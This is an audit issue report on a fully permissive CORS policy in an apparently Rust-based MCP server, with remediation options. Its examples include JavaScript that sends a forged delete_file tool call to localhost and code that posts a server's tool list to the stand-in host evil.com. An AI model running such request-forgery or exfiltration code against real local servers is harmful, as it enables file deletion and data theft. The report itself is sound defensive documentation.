# Issue: Permissive CORS Configuration

## Location
`src/server.rs:91`

## Severity
Medium-High - Security vulnerability

## Description
The server uses a fully permissive CORS policy:

```rust
let router = Router::new()
    .nest_service("/mcp", http_service)
    .layer(CorsLayer::permissive());
```

## Problem
`CorsLayer::permissive()` allows:
- **Any origin** (`Access-Control-Allow-Origin: *`)
- **Any method** (GET, POST, PUT, DELETE, etc.)
- **Any headers**
- **Credentials from any origin**

This completely disables CORS protection.

## Security Implications

### Cross-Site Request Forgery (CSRF)
```javascript
// Malicious website example.com
fetch('http://localhost:8080/mcp/tools/call', {
    method: 'POST',
    body: JSON.stringify({
        name: 'delete_file',
        arguments: { path: '/important/data' }
    })
});
// ← This works! No CORS protection!
```

### Data Exfiltration
```javascript
// Malicious site steals data via user's browser
fetch('http://localhost:8080/mcp/tools/list')
    .then(r => r.json())
    .then(data => {
        // Send user's tool configurations to attacker
        fetch('https://evil.com/steal', {
            method: 'POST',
            body: JSON.stringify(data)
        });
    });
```

### Session Hijacking
If the server uses session tokens or cookies, malicious sites can:
- Make authenticated requests on behalf of the user
- Steal session data
- Perform actions without user consent

## Real-World Attack Scenarios

### Scenario 1: Localhost Exploitation
```
1. User visits malicious website
2. Website makes requests to http://localhost:8080/mcp
3. Server accepts requests (permissive CORS)
4. Attacker executes tools using user's local server
```

### Scenario 2: Internal Network Access
```
1. Server runs on internal network (e.g., 192.168.1.100:8080)
2. User on same network visits malicious site
3. Site makes requests to http://192.168.1.100:8080
4. Attacker accesses internal MCP server
```

### Scenario 3: Public Server
```
If server is exposed publicly:
1. Any website can make requests
2. No origin restrictions
3. Complete lack of access control
```

## Why This Is Especially Dangerous for MCP

MCP servers often have powerful capabilities:
- File system access
- Database queries
- Command execution
- Browser automation
- API calls to external services

Permissive CORS means any malicious website can invoke these capabilities through the user's browser.

## Recommendation

### Option 1: Restrict Origins (Best for Production)
```rust
use tower_http::cors::{CorsLayer, Any};

let cors = CorsLayer::new()
    .allow_origin([
        "http://localhost:3000".parse()?,
        "https://app.kodegen.ai".parse()?,
    ])
    .allow_methods([Method::GET, Method::POST])
    .allow_headers([CONTENT_TYPE, AUTHORIZATION]);

let router = Router::new()
    .nest_service("/mcp", http_service)
    .layer(cors);
```

### Option 2: Make Configurable
```rust
// In cli.rs
#[arg(long, value_name = "ORIGIN")]
pub allowed_origins: Vec<String>,

// In server.rs
pub fn with_cors_origins(self, origins: Vec<String>) -> Self {
    // ...
}
```

### Option 3: Localhost Only
If only local clients should connect:
```rust
let cors = CorsLayer::new()
    .allow_origin([
        "http://localhost:*".parse()?,
        "http://127.0.0.1:*".parse()?,
    ])
    .allow_methods([Method::GET, Method::POST])
    .allow_headers(Any);
```

### Option 4: Same-Origin Only
Most restrictive:
```rust
// Remove .layer(CorsLayer::permissive())
// Default behavior: same-origin only
```

## When Permissive CORS Might Be Acceptable

**Only** in these limited scenarios:
1. **Development only** (not production)
2. **Isolated network** with no external access
3. **Public read-only API** with no sensitive data
4. **Already behind authentication layer** (but still risky)

## Documentation Required

If keeping permissive CORS (not recommended), add:
```rust
/// WARNING: Uses permissive CORS policy for development.
/// DO NOT USE IN PRODUCTION - any website can make requests to this server.
/// Set appropriate CORS restrictions before deploying to production environments.
.layer(CorsLayer::permissive())
```

## Related Standards
- [OWASP CORS Guide](https://owasp.org/www-community/attacks/csrf)
- [MDN CORS Documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [CWE-346: Origin Validation Error](https://cwe.mitre.org/data/definitions/346.html)
